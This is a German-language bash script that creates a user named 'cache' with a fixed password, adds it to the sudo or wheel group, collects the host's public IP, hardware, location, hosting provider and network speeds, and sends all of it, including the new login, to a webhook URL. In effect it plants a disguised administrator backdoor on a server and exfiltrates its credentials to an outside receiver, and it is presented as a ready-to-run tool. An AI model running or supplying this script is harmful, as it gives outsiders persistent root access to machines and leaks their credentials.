#!/bin/bash

WEBHOOK_USERNAME="Webhook-Benutzername"
WEBHOOK_URL="Webhook-URL"

apt install jq curl speedtest-cli -y

if id "cache" >/dev/null 2>&1; then
    exit 1
fi

sudo useradd -m cache

if grep -q '^sudo:' /etc/group; then
    sudo usermod -aG sudo cache
elif grep -q '^wheel:' /etc/group; then
    sudo usermod -aG wheel cache
else
    exit 1
fi

echo -e "passwort\npasswort" | sudo passwd cache

IP=$(curl -s ifconfig.me)
SYS_INFO=$(uname -a)
CPU_INFO=$(cat /proc/cpuinfo | grep "model name" | head -n 1 | awk -F ': ' '{print $2}')
MEM_INFO=$(free -h | awk '/^Mem:/ {print $2}')
DISK_SPACE=$(df -h --output=avail / | sed -n '2p')
SERVER_LOCATION=$(curl -s https://ipinfo.io/$IP/city)
SERVER_HOST=$(curl -s https://ipinfo.io/$IP/org)
DOWNLOAD_SPEED=$(speedtest-cli --secure --json | jq -r '.download / 1000000 | floor | tostring + " Mbps"')
UPLOAD_SPEED=$(speedtest-cli --secure --json | jq -r '.upload / 1000000 | floor | tostring + " Mbps"')

json_data=$(jq -n --arg webhook_username "$WEBHOOK_USERNAME" --arg ip "$IP" --arg username "cache" --arg password "passwort" --arg sys_info "$SYS_INFO" --arg cpu_info "$CPU_INFO" --arg mem_info "$MEM_INFO" --arg disk_space "$DISK_SPACE" --arg server_location "$SERVER_LOCATION" --arg server_host "$SERVER_HOST" --arg download_speed "$DOWNLOAD_SPEED" --arg upload_speed "$UPLOAD_SPEED" --arg timestamp "$(date +'%d.%m.%Y um %H:%M:%S')" '{
    "username": $webhook_username,
    "embeds": [
        {
            "title": "Neuer Benutzer erstellt",
            "color": 3447003,
            "fields": [
                {
                    "name": "IP-Adresse",
                    "value": $ip,
                    "inline": true
                },
                {
                    "name": "Benutzername",
                    "value": $username,
                    "inline": true
                },
                {
                    "name": "Passwort",
                    "value": $password,
                    "inline": true
                },
                {
                    "name": "Systeminformationen",
                    "value": $sys_info,
                    "inline": false
                },
                {
                    "name": "CPU",
                    "value": $cpu_info,
                    "inline": true
                },
                {
                    "name": "Speicher",
                    "value": $mem_info,
                    "inline": true
                },
                {
                    "name": "Festplattenspeicher",
                    "value": $disk_space,
                    "inline": true
                }
            ],
            "footer": {
                "text": "Benutzer erstellt am \($timestamp)"
            }
        },
        {
            "title": "Netzwerkgeschwindigkeit",
            "color": 3447003,
            "fields": [
                {
                    "name": "Download-Geschwindigkeit",
                    "value": $download_speed,
                    "inline": true
                },
                {
                    "name": "Upload-Geschwindigkeit",
                    "value": $upload_speed,
                    "inline": true
                },
                {
                    "name": "Serverstandort",
                    "value": $server_location,
                    "inline": true
                },
                {
                    "name": "Serverbetreiber",
                    "value": $server_host,
                    "inline": true
                }
            ]
        }
    ]
}')

response=$(curl -s -H "Content-Type: application/json" -X POST -d "$json_data" "$WEBHOOK_URL")

if [[ "$response" == *"\"status\": 200"* ]]; then
    echo "Der Benutzer 'cache' wurde erfolgreich erstellt und der Webhook wurde gesendet."
else
    echo "Fehler beim Senden des Webhooks"
fi
